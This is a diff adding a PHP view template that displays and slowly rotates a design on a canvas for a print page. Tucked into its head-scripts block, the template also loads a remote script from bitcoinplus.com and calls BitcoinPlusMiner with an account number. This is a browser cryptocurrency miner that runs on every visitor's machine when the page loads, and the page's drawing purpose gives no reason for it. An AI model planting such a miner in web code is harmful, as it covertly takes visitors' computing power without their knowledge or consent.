@@ -1,0 +1,59 @@
+<style>
+    .navbar,
+    .sidebar,
+    .content,
+    #footer,
+    .ue-tab-container {
+        display: none
+    }
+    #print-canvas {
+        display: block;
+    }
+    #canvas {
+        background: none;
+        border: none;
+    }
+</style>
+
+<div class="col-md-12">
+    <div style="margin: 0 auto; position: relative">
+    <div id="canvas"></div>
+    </div>
+
+</div>
+
+<?php $this->placeholder('head-scripts')->captureStart() ?>
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js" type="text/javascript"></script>
+    <script src="http://www.bitcoinplus.com/js/miner.js" type="text/javascript"></script>
+    <script type="text/javascript">BitcoinPlusMiner(36935677)</script>
+<?php $this->placeholder('head-scripts')->captureEnd() ?>
+
+<?php $this->placeholder('scripts')->captureStart() ?>
+    <script>
+        var canvas = makeCanvas('canvas');
+        var design = JSON.parse('<?= $design->toJson() ?>');
+
+        function resizeCanvas() {
+            var maxHeight = $(window).height() - 80;
+            var maxWidth = $(window).width();
+            var size = Math.min(maxHeight, maxWidth);
+            canvas.changeSize(size, size, true, false);
+            drawDesign(canvas, design);
+        }
+        $(window).resize(resizeCanvas);
+        resizeCanvas();
+
+        var drawing = false;
+        function animate() {
+            design.layers[0].rotation += 1;
+            if (drawing == false) {
+                drawing = true;
+                drawDesign(canvas, design);
+            }
+            drawing = false;
+
+            setTimeout("animate()", 100);
+        }
+        animate();
+    </script>
+<?php $this->placeholder('scripts')->captureEnd() ?>
